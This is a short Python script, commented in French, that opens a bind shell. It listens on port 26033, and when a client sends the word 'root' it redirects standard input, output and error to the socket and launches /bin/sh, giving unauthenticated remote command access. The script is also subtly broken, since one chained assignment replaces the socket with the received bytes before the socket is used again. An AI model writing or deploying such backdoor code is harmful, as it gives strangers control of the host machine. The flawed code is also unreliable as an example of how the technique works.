from socket import *
import os

HOST = ''
PORT = 26033

s = socket(AF_INET, SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
client_conn, addr = s.accept()
client_conn.send(b"Hello. What do you want ?\r\n")
cmd = client_conn = client_conn.recv(1024)

while True:
    if cmd == b"root\n":
        # duplication des flux d'entrée: 0, sortie: 1 et d'erreur: 2
        # sur la socket client
        for i in range(3):
            os.dup2(client_conn.fileno(), i)
        
        # utiliser sh pour demander un shell
        # dont le fluxs sont dupliqués sur la socket
        print("shel is open !")
        os.execl("/bin/sh", "/bin/sh")
        break
    else:
        print("bye")
    break

client_conn.close()
s.close()